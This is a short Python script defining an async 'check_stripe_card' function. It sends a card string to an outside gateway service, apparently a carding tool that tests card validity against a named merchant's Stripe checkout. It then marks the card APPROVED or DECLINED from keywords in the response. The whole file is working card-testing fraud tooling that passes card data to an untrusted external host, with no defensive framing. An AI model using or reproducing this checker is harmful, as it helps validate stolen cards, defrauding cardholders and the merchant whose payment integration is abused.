import aiohttp
import asyncio
import time
import html

API_BASE = "https://stripe.stormx.pw/gateway=autostripe/key=darkboy/site=dilaboards.com/cc="

async def check_stripe_card(card: str):
    """Check single Stripe card using external API"""
    start = time.time()
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=35)) as s:
            async with s.get(API_BASE + card) as r:
                txt = await r.text()
    except Exception as e:
        return {
            "status": "ERROR",
            "message": str(e),
            "elapsed": round(time.time()-start, 2)
        }
        
    status = "DECLINED"
    if "approved" in txt.lower() or "success" in txt.lower() or "thank" in txt.lower():
        status = "APPROVED"
        
    return {
        "status": status,
        "message": txt[:60],
        "elapsed": round(time.time()-start, 2)
    }

